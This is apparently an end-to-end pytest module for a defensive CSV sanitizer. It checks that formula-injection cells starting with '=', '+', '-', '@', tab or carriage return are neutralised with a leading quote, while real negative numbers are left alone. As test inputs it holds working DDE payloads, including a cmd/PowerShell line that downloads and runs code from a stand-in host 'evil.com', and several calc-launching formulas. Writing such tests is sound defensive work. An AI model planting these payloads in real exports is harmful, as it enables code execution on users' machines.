"""
Tier 2: Boundary & Corner Cases - Module B07: Adversarial Formula Injection Attacks.
Validates robust neutralization of CSV formula injection payloads starting with '=', '+', '-', '@', '\\t', '\\r'.
"""

import pandas as pd
import pytest
from tests_e2e.test_contracts import get_export_dataset_fn, get_sanitize_csv_cell_fn
from tests_e2e.conftest import assert_formula_safe


@pytest.fixture
def sanitize_fn():
    return get_sanitize_csv_cell_fn()


@pytest.fixture
def export_fn():
    return get_export_dataset_fn()


def test_formula_injection_cmd_calc_neutralization(sanitize_fn):
    """Payloads attempting command execution via '=cmd|' are neutralized with a leading single quote."""
    dangerous = "=cmd|'/C powershell IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com\")'!A0"
    sanitized = sanitize_fn(dangerous)
    assert sanitized.startswith("'=")


def test_formula_injection_at_sum_neutralization(sanitize_fn):
    """Payloads utilizing spreadsheet formulas like '@SUM' are neutralized."""
    payload = "@SUM(1+1)*cmd|' /C calc'!A0"
    sanitized = sanitize_fn(payload)
    assert sanitized.startswith("'@")


def test_formula_injection_tab_and_carriage_return_neutralization(sanitize_fn):
    """Payloads starting with tab (\\t) or carriage return (\\r) for DDE execution are neutralized."""
    tab_payload = "\tDDE(\"cmd\";\"/C calc\";\"__DdeLink__\")"
    cr_payload = "\r=1+1"

    assert sanitize_fn(tab_payload).startswith("'\t")
    assert sanitize_fn(cr_payload).startswith("'\r")


def test_formula_injection_dataset_export_integrity(export_fn):
    """Full dataset with multiple injected columns exports into a safe CSV conforming to assert_formula_safe."""
    df_poisoned = pd.DataFrame([
        {"Customer": "=cmd|' /C calc'!A0", "Note": "+1234567", "Amount": -50.25},
        {"Customer": "@SUM(A1:A5)", "Note": "-2+3*4", "Amount": 100.0},
        {"Customer": "\tmalicious_tab", "Note": "\rmalicious_cr", "Amount": -12.0}
    ])

    csv_bytes = export_fn(df_poisoned, format="csv")
    csv_text = csv_bytes.decode("utf-8")

    assert_formula_safe(csv_text)


def test_formula_injection_distinguishes_genuine_negative_numbers(sanitize_fn):
    """Legitimate negative accounting entries (-42.50, -100) are not quoted, while text formulas (-2+3*4) are quoted."""
    assert float(sanitize_fn(-42.50)) == -42.50
    assert not str(sanitize_fn(-42.50)).startswith("'")
    assert not str(sanitize_fn("-42.50")).startswith("'")
    assert not str(sanitize_fn("+100")).startswith("'")

    # Non-numeric text starting with + or - must be quoted
    assert sanitize_fn("-2+3*4").startswith("'-")
    assert sanitize_fn("+cmd|'calc'").startswith("'+")


def test_formula_safe_verifier_catches_unquoted_payload():
    """Negative test: assert_formula_safe properly raises AssertionError on unquoted formula."""
    bad_csv = "Name,Amount\n=cmd|'calc'!A0,100"
    with pytest.raises(AssertionError):
        assert_formula_safe(bad_csv)
